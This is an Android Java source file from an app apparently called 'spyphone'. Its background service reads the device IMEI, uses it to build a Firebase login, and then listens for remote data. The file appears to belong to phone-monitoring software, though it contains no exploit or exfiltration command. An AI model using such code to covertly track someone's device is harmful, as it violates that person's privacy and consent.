package emit.esy.es.spyphone.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.firebase.client.Firebase;

import emit.esy.es.spyphone.R;
import emit.esy.es.spyphone.util.FirebaseUtil;

/**
 * Created by Emil Makovac on 21/04/2015.
 */
public class BrokerService extends Service {

    private final String LOG_TAG = "BrokerService";
    String IMEI, username, password;
    FirebaseUtil fu;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(LOG_TAG, "onCreate");
        Firebase.setAndroidContext(this);
        password = getString(R.string.password);
        username = createUsername();

        //Authenticate user to firebase
        fu = new FirebaseUtil(this, username, password);
        fu.authenticateUser();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(LOG_TAG, "onStartCommand");

        fu.setUpChildRef();

        return START_NOT_STICKY;
    }

    private String createUsername() {
        TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
        IMEI = telephonyManager.getDeviceId();
        return buildUserName(IMEI);
    }

    private String buildUserName(String imei) {
        return "device" + imei + "@spyphone.emit";
    }


    @Override
    public IBinder onBind(Intent intent) {
        Log.d(LOG_TAG, "onBind");
        return null;
    }


    @Override
    public void onDestroy() {
        Log.d(LOG_TAG, "onDestroy");
        fu.removeListener();
        super.onDestroy();
    }

}
